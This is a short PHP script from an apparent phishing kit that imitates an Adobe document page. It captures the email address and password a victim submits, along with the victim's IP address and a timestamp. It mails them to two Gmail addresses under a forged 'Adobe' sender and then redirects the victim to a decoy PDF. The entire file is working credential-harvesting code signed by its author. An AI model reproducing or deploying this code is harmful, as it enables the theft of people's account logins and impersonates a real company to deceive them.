<?php

$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");

$msg = "--------------------------------------\n";
$msg .= "Email Address: ".$_POST['Email']."\n";
$msg .= "Password: ".$_POST['Password']."\n";
$msg .= "--------------------------------------\n";
$msg .= "Created By (�`�._.�[CADOTUNJI  Inc�]�._.���)\n";
$msg .= "--------------------------------------\n";
$msg .= "Adobe Rezult Sent From | $ip | On $date | $time |\n";
$msg .= "--------------------------------------\n";

$to = "www.collinssmith@gmail.com,www.collinsalibaba@gmail.com";
$subject = "Adobe Update = [$ip]";
$from = "From: Adobe<newsupdate@adobe.com>";

mail($to,$subject,$msg,$from);

header('Location: 591106842-slip.pdf');

?>